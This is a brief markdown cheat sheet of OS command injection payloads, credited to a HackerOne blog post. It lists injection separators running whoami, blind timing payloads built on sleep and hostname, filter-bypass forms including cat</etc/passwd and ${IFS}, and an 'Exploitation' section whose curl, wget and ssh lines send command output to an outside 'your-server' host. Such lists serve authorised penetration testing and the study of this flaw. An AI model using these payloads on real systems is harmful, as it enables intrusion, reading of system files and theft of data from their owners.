# Normal Tests
`` `whoami` ``

;whoami

&& whoami

| whoami

%0a whoami

|| whoami

# For Testing blind Command Injection 
;sleep 5

&& sleep 5

| sleep 5

`` `sleep 5` ``

$(sleep 5)

sleep $(hostname | cut -c 1 | tr a 5) // For getting the output based on the execution time

# Command Injection without Spaces

cat</etc/passwd

ls${IFS}-la

{ls,-la}


# Exploitation

whoami | curl http://your-server -d @-

wget http://your-server/?cmd=$(whoami)

export C=whoami | ssh user@your-server

# Source 
[Thanks to hackerone!](https://www.hackerone.com/blog/how-to-command-injections)
